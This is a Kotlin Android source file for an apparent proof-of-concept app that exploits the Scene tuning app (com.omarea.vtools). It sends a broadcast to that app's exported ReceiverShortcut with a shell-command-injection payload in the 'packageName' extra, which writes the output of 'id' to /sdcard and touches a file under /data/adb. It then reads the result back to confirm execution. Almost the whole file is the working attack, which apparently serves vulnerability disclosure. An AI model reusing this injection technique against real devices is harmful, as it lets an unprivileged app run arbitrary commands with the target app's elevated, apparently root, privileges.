package com.hamjin.scenrootcheck

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.hamjin.scenrootcheck.ui.theme.ScenRootCheckTheme
import java.io.File
import kotlin.concurrent.thread
import androidx.core.net.toUri

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU){
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    "package:$packageName".toUri()
                )
                startActivity(intent)
            }
        } else if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_EXTERNAL_STORAGE)
            != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                100);
        }
        setContent {
            ScenRootCheckTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    MainScreen(
                        modifier = Modifier.padding(innerPadding),
                        onSendBroadcast = { callback ->
                            sendExploitBroadcast(callback)
                        }
                    )
                }
            }
        }
    }

    private fun sendExploitBroadcast(onResult: (String) -> Unit) {
        val randomFile = "scene_poc_${System.currentTimeMillis()}.txt"
        val intent = Intent()
        intent.setClassName("com.omarea.vtools", "com.omarea.scene_mode.ReceiverShortcut")
        
        // 构造payload: 使用指定的shell命令并将输出重定向到 /sdcard/$randomFile。
        // 添加了 chmod 666 以确保当前应用在没有特殊权限的情况下也能读取该文件。
        val payload = "x; touch /data/adb/scene_poc; id >> /sdcard/$randomFile; chmod 666 /sdcard/$randomFile; #"
        intent.putExtra("packageName", payload)
        sendBroadcast(intent)

        // 等待一段时间，让目标应用的Receiver处理广播并执行shell命令
        thread {
            Thread.sleep(1500) 
            val file = File("/sdcard/$randomFile")
            if (file.exists()) {
                try {
                    val content = file.readText()
                    file.delete()
                    runOnUiThread { onResult("执行成功，文件内容：\n$content") }
                } catch (e: Exception) {
                    runOnUiThread { onResult("读取文件出错: ${e.message}") }
                }
            } else {
                runOnUiThread { onResult("执行失败: 未找到文件 (/sdcard/$randomFile)") }
            }
        }
    }
}

@Composable
fun MainScreen(modifier: Modifier = Modifier, onSendBroadcast: ((String) -> Unit) -> Unit) {
    var resultText by remember { mutableStateOf("点击下方按钮发送广播") }

    Column(modifier = modifier.padding(16.dp)) {
        Button(onClick = { 
            resultText = "正在发送广播并等待结果..."
            onSendBroadcast { result ->
                resultText = result
            }
        }) {
            Text("Send Broadcast")
        }
        Spacer(modifier = Modifier.height(16.dp))
        Text(text = resultText)
    }
}
